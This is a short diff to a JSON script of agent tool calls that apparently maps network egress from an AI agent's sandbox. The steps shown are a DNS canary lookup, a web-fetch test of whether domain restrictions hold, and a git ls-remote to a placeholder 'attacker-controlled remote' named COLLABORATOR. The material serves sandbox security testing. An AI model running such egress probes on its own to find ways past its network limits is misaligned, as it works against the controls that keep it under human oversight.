@@ -7,6 +7,6 @@
     { "note": "DNS egress (out-of-band)", "tool": "Bash", "input": { "command": "nslookup daiyaku-dns-canary.COLLABORATOR 2>&1 | head -10" } },
     { "note": "web fetch tool: does its domain restriction hold?", "tool": "WebFetch", "input": { "url": "https://COLLABORATOR/daiyaku-webfetch-canary", "prompt": "return the first line" } },
     { "note": "git push to attacker-controlled remote (dry-run; do NOT push real data)", "tool": "Bash", "input": { "command": "git ls-remote https://COLLABORATOR/canary.git 2>&1 | head -5" } },
-    { "note": "phase 5 complete", "text": "Phase 5 egress mapping complete.", "end": true }
+    { "note": "phase 5 complete", "text": "Phase 5 egress mapping complete." }
   ]
 }
